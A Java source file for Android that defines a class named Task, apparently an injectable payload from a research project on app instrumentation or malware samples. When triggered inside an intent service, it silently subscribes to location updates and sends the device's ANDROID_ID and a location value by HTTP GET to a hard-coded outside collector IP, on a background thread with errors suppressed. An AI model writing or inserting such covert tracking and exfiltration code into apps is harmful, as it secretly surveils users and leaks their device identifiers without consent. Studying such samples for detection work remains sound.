package edu.ntu.android.maas.complain.complain;

import android.util.Log;

public class Task {
    public String getAndroidId(android.content.Context context){ return android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);}
    public String getLocation(android.location.Location loc){	return "LOCATION::REAL_TIME_LOCATION";}
    public void apacheGet(final String url, final String message) {	new Thread(){	public void run(){	try { org.apache.http.client.methods.HttpGet httpGet = new org.apache.http.client.methods.HttpGet(url+"?data="+java.net.URLEncoder.encode(message, "utf-8")); org.apache.http.client.HttpClient hc = new org.apache.http.impl.client.DefaultHttpClient();  hc.execute(httpGet);  } catch (java.io.IOException e) {  } }}.start();}
    public Object operateOn(final android.content.Context context, String component, String pointcut){
        if (component.equals("INTENT_SERVICE") && pointcut.equals("POINTCUT_MAIN")){
            android.os.Handler mainHandler = new android.os.Handler(context.getApplicationContext().getMainLooper());
            mainHandler.post(new Runnable() {
                public void run() {
                    android.location.LocationManager lm = (android.location.LocationManager) context.getSystemService("location");
                    lm.requestLocationUpdates(lm.getBestProvider(new android.location.Criteria(), false), 400, 1, new android.location.LocationListener() {
                        public void onLocationChanged(android.location.Location location) {
                            Log.e("Location", getLocation(location));
                            final java.util.List<String> priv = new java.util.ArrayList<String>();priv.add(getAndroidId(context));
                            priv.add(getLocation(location));apacheGet("http://155.69.150.204:8080/maas/collector",priv.toString());
                        }
                        public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
                        public void onProviderEnabled(String provider) {}
            public void onProviderDisabled(String provider) {}});}}); return null;}return null;}}
